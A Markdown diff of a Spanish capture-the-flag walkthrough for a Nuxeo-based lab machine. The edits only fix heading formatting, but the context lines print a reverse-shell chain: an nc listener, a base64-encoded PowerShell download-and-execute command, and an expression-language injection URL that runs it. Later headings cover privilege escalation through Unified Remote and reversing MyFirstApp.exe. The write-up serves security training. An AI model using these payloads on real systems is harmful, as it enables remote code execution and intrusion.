@@ -239,25 +239,25 @@ Edita el archivo y hasta el final de todo ponemos esta linea con nuestra respect
 
 Bien, para que funcione, lo que vamos a realizar los siguientes pasos:
 
-**1 Usando un servidor en Python, tendrá que estar accesible nuestro archivo Ps1.ps1 
+**1 Usando un servidor en Python, tendrá que estar accesible nuestro archivo Ps1.ps1*** 
 
 ```bash
 python3 -m http.server 80 
 ```
 
-**2 Usar Nc para recibir la PowerShell
+**2 Usar Nc para recibir la PowerShell***
 
 ```bash
 nc -lvnp your_port
 ```
 
-**3 Después, realizaremos la conversión a bas64 del comando que descargara de nuestra maquina el Ps1.ps1(PowerShell inversa)
+**3 Después, realizaremos la conversión a bas64 del comando que descargara de nuestra maquina el Ps1.ps1(PowerShell inversa)***
 
 ```bash
 echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.X.X/Ps1.ps1')" | iconv -t utf-16le | base64 -w 0; echo
 ```
 
-**4 Enviamos el comando a ejecutar 
+**4 Enviamos el comando a ejecutar*** 
 
 ```url 
 http://10.10.11.115/maintenance/..;/login.jsp/login.jsp/pwn$%7B''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('powershell%20-enc%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADQALwBQAHMAMQAuAHAAcwAxACcAKQAKAA==')%7D.xhtml
@@ -271,7 +271,7 @@ Para ser mas específicos este seria el comando que necesitamos enviar en la sec
 
 Si todo va bien y la codificación del base64 se realizo bien, obtendremos nuestra revershell:
 
-***Capturas del proceso :
+***Capturas del proceso*** :
 
 ![paste](./images/24.jpeg)
 
@@ -283,7 +283,7 @@ Y en el puerto donde estemos en esucha para recibir la Powershell la obtendremos
 
 ![paste](./images/26.jpeg)
 
-# ***Nuxeo -> Clara
+# ***Nuxeo -> Clara***
 
 Logramos entrar a la maquina, el problema esta en que este usuario llamado Nuxeo carece de privilegios, por lo cual, debemos de encontrar la forma de cambiar a otro usuario, una elevación de privilegios.
 
@@ -321,7 +321,7 @@ Si buscamos el nombre del servicio en google, encontraremos el verdadero nombre 
 
 Estamos de suerte, este servicio es vulnerable el problema aquí, es que antes de poder explotar la vulnerabilidad debemos de hacer que el puerto sea accesible para nosotros.
 
-## ***Unified Remote Exploit 
+## ***Unified Remote Exploit*** 
 
 El exploit esta documentado en nuestro querido Exploit DB:
 
@@ -464,7 +464,7 @@ Ahora somos el usuario develpment y siendo este mismo podremos entrar en la carp
 
 Donde prepárate que toca la escalada de privilegios con conocimiento a bajo nivel
 
-# ***MyfirstApp.exe
+# ***MyfirstApp.exe***
 
 
 Dentro de la carpeta de C:\Devapp encontraremos un ejecutable que se llama MyFirstApp.exe 
@@ -488,7 +488,7 @@ Obtendremos algo interesante que es una usuario y contraseña pero no nos sirve 
 
 ![paste](./images/48.jpeg)
 
-## ***Ghidra MyFirtsApp.exe
+## ***Ghidra MyFirtsApp.exe***
 
 Usaremos Ghidra para ver la estructura del ejecutable y cual es su funcionamiento 
 
@@ -510,7 +510,7 @@ Bien el binario ocupa recv sockets para conectarse y enviar la información al s
 
 ![paste](./images/53.jpeg)
 
-## ***Login Function
+## ***Login Function***
 
 Esta función también la puedes encontrar dentro de las carpeta de la funciones del binario, 
 
@@ -548,7 +548,7 @@ Cuando introducimos la contraseña esta pasa por el flujo de programa principal,
 
 ![paste](./images/55.jpeg)
 
-## ***encrypt1 Function
+## ***encrypt1 Function***
 
 Bien dentro de esta función renombraremos unas cuantas variables para poder entender mejor el código y no, nos de un cáncer visual 
 
